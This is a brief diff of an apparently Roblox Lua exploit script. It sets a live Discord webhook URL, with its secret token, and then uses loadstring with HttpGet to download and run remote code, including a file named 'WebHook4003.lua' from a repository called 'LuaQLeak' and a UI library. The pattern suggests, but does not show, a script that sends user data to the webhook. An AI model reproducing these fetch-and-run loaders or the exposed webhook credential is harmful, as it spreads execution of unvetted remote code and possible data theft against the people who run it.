@@ -1,4 +1,5 @@
-getgenv().WebhookHere = "https://discord.com/api/webhooks/1071171596984783000/LLu6avixwrKfaPZuF6VN5aWZxLgagb4cSqyc6HGpD8VnclLCLOb0JXxfEvkx-eSXOExu"
+getgenv().WebhookHere =
+ "https://discord.com/api/webhooks/1071171596984783000/LLu6avixwrKfaPZuF6VN5aWZxLgagb4cSqyc6HGpD8VnclLCLOb0JXxfEvkx-eSXOExu"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQLeak/Scripts/main/WebHook4003.lua"))()
 
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
